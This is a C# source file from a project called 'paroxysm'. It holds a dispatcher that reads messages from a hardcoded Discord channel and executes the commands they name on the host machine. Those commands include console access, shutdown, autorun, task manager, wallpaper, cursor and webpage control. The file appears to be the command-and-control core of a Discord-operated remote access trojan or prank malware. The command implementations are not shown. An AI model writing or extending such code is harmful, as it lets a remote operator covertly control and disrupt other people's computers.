using Discord.WebSocket;
using paroxysm.API.Commands;
using paroxysm.API.Commands.Extern;

namespace paroxysm.API;

public static class DiscordCommand
{
    public static ICommand[] GetCommands()
    {
        return new ICommand[]
        {
            new ConsoleCmd(),
            new WallpaperCmd(),
            new PingCmd(),
            new ShutdownCmd(),
            new AutoRunCmd(),
            new CursorCmd(),
            new TaskManagerCmd(),
            new WebpageCmd()
        };
    }

    [Obsolete("Obsolete")]
    public static Task OnMessageReceivedAsync(SocketMessage message)
    {
        if (message is not SocketUserMessage) return Task.CompletedTask;
        if (message.Channel.Id != ulong.Parse("1170294233656217630") &&
            message.Channel.Id != DiscordStatement.CurrentChannel.Id) return Task.CompletedTask;

        var parameters = message.Content.Split(" ");
        var commandName = parameters[0].Replace("!", "").Trim();
        var commandParams = parameters.Skip(1).ToArray();

        var author = message.Author.Username;

        var commands = GetCommands();
        foreach (var command in commands)
        {
            if (command.Options().Name != commandName) continue;

            command.Execute(commandParams);
            var formattedParams = string.Join(", ", commandParams);
            Console.WriteLine($"User {author} has executed command ({command.Options().Name} {formattedParams})");
        }

        return Task.CompletedTask;
    }
}